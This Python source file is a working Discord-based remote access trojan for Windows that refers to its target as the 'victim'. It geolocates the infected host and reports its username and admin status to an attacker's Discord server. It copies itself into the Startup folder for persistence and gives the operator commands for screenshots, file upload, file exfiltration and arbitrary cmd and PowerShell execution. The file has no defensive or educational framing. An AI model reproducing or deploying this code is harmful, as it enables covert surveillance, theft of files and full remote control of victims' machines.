import ctypes
import logging
import subprocess
import os
import platform
import urllib.request
import json
import time

import pyautogui
import discord
from discord.ext import commands

# for client not yet connect internet
botstart = False
while not botstart:
    try:
        bot = commands.Bot(command_prefix = "!")
        botstart = True
    except:
        time.sleep(3)

logger = logging.getLogger(__name__)

# define global variable
flag = None
ip = None
city = None
channel_name = None
channel_id = None
timeout = 2

# for run program on startup
selfname = 'command.exe'
startup_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{selfname}"

async def send_message(ctx, message):
    """
    For send message.
    """
    if len(message) < 3990:
        await ctx.message.channel.send(message)
    else:
        filename = 'text.txt'
        filepath = os.path.join( os.getenv('TEMP') , filename)
        with open(filepath, 'a') as f:
            f.write(message)

        file = discord.File(filepath, filename=filename)
        await ctx.message.channel.send("Command successfully executed", file=file)
        os.remove(filepath)

@bot.event
async def on_ready():
    global flag
    global ip
    global city
    global channel_name
    global channel_id

    # Get victim geolocation
    logger.debug("on ready ...")
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
        city = data['city']

    # create channel if not exist
    channel_name = f"{os.getlogin()}-{ip.replace('.', '_') }"
    channel = discord.utils.get(bot.guilds[0].channels, name=channel_name)
    if channel:
        logger.debug("Channel already exist")
    else:
        channel = await bot.guilds[0].create_text_channel(channel_name)
        logger.debug(f"Create new channel Name: {channel} ID: {channel.id}")
    channel_id = channel.id

    # Send victim information
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"New session opened {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}"
    if is_admin == True:
        value1+= " | ADMIN"
    await channel.send(value1)

    # Send program to startup
    result = subprocess.run(
        ['copy', selfname,startup_path ],
        shell = True, 
        stdout = subprocess.PIPE, 
        stderr = subprocess.PIPE,
        stdin = subprocess.PIPE
    )
    if result.stdout:
        await channel.send(str(result.stdout.decode()))
    elif result.stderr:
        await channel.send(str(result.stderr.decode()))

    game = discord.Game(f"Window logging stopped")
    await bot.change_presence(status=discord.Status.online, activity=game)

@bot.command(
        name = "test",
        help=':For test bot command.'
    )
async def test( ctx):
    logger.debug("test command")
    await send_message(ctx, "Test bot command.")


@bot.command(
        name = "info",
        help=':Get victim informations.'
    )
async def info( ctx):
    logger.debug("info command")
    await ctx.send((
        f"IP {ip}\n"
        f"city {city} {flag}\n"
        f"machine {platform.processor()}\n"
        f"platform {platform.platform()}"
    ))

@bot.command(
        name = "screenshot",
        help=':Get victim informations.'
    )
async def screenshot( ctx):
    logger.debug("info command")
    filename =  "monitor.png"
    savepath =os.path.join( os.getenv('TEMP') , filename)

    pyautogui.screenshot(savepath)
    file = discord.File(savepath, filename= filename)
    await ctx.channel.send("Command successfully executed", file=file)
    os.remove(savepath)

@bot.command(
        name = "isadmin",
        help=':Check if user is admin or not.'
    )
async def isadmin( ctx):
    logger.debug("isadmin command")
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        await ctx.channel.send("Yes !!")
    elif is_admin == False:
        await ctx.channel.send("Nope ...")


@bot.command(
        name = "upload",
        help=':Upload content.'
    )
async def upload(ctx):
    await ctx.message.attachments[0].save(ctx.message.content[8:])
    await ctx.message.channel.send("[*] Command successfully executed")

@bot.command(
        name = "download",
        help=':Download content EX: !download C:/somefile.txt.'
    )
async def download(ctx):
    filepath  = ctx.message.content[10:]
    filename = os.path.basename(filepath)
    logger.debug(f'download command with input {filepath}')
    try:
        file = discord.File(filepath, filename=filepath)
        await ctx.message.channel.send("Command successfully executed", file=file)
    except FileNotFoundError:
        await ctx.message.channel.send("File not found.")
    except PermissionError:
        await ctx.message.channel.send(f"Permission denied: {filepath}")

@bot.command(
        name = "pwd",
        help=':Get the Current Working Directory.'
    )
async def pwd(ctx):
    logger.debug(f'pwd command')
    current_directory = os.getcwd()
    await send_message(ctx, current_directory)

@bot.command(
        name = "cmd",
        help=':Run custom command by cmd.'
    )
async def cmd(ctx):

    instruction = ctx.message.content[5:]
    logger.debug(f'cmd command with input "{instruction}"')
    try:
        result = subprocess.run(
            instruction, 
            shell = True,  
            stdout = subprocess.PIPE, 
            stderr = subprocess.PIPE, 
            stdin = subprocess.PIPE,
            timeout= timeout 
        )
        if result.stderr:
            await send_message(ctx, str(result.stderr.decode()))
        if result.stdout:
            await send_message(ctx, str(result.stdout.decode()))
    except subprocess.TimeoutExpired:
        await ctx.channel.send("Command time out")

@bot.command(
        name = "powershell",
        help=':Run custom command by powershell.'
    )
async def powershell(ctx):

    tmp = ctx.message.content.split()
    logger.debug(f'number of message content "{len(tmp)}"')
    instruction = ["powershell"]
    instruction.extend(tmp[1:])
    logger.debug(f'powershell command with input "{instruction}"')
    try:
        result = subprocess.run(
            instruction , 
            shell = True, 
            stdout = subprocess.PIPE, 
            stderr = subprocess.PIPE, 
            stdin = subprocess.PIPE ,
            timeout = timeout
        )
        if result.stderr:
            await send_message(ctx, str(result.stderr.decode()))
        if result.stdout:
            await send_message(ctx, str(result.stdout.decode()))
    except subprocess.TimeoutExpired:
        await ctx.channel.send("Command time out")


if __name__ == "__main__":
    logging.basicConfig()
    logger.setLevel(logging.DEBUG)

    # for testing
    from dotenv import load_dotenv
    load_dotenv('.env')
    token = os.getenv("DISCORD_TOKEN")

    # input your token here
    # token = ""

    bot.run(token)